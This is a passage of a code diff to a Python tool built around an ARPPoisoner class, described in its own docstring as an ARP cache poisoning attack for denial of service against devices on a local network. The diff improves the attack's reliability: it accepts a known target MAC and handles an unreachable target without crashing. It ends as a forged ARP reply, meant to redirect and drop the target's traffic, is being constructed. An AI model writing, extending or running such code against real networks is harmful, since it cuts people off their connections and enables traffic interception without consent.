@@ -27,19 +27,22 @@ def get_all_hosts(subnet: str, timeout: float = 3.0) -> list[tuple[str, str]]:
 class ARPPoisoner:
     """ARP cache poisoning attack for device denial-of-service."""
 
-    def __init__(self, target_ip: str, gateway_ip: str, interface: str | None = None):
+    def __init__(self, target_ip: str, gateway_ip: str, interface: str | None = None, target_mac: str | None = None):
         """Initialize the ARP poisoner.
 
         Args:
             target_ip: IP of the device to disconnect.
             gateway_ip: IP of the network gateway.
             interface: Network interface to use (auto-detected if None).
+            target_mac: MAC of target (if known). Avoids needing to re-resolve.
         """
         self.target_ip = target_ip
         self.gateway_ip = gateway_ip
         self.interface = interface or conf.iface
+        self.target_mac = target_mac
         self._running = False
         self._thread: threading.Thread | None = None
+        self.error: str | None = None
 
     def _get_mac(self, ip: str) -> str | None:
         """Resolve IP to MAC address via ARP."""
@@ -47,9 +50,11 @@ class ARPPoisoner:
 
     def _poison(self) -> None:
         """Send poisoned ARP replies continuously."""
-        target_mac = self._get_mac(self.target_ip)
+        target_mac = self.target_mac or self._get_mac(self.target_ip)
         if not target_mac:
-            raise RuntimeError(f"Could not resolve MAC for {self.target_ip}")
+            self.error = f"Could not resolve MAC for {self.target_ip} — device may be offline"
+            self._running = False
+            return
 
         # Tell target that gateway is at OUR MAC (we drop the traffic = kill)
         poison_packet = Ether(dst=target_mac) / ARP(
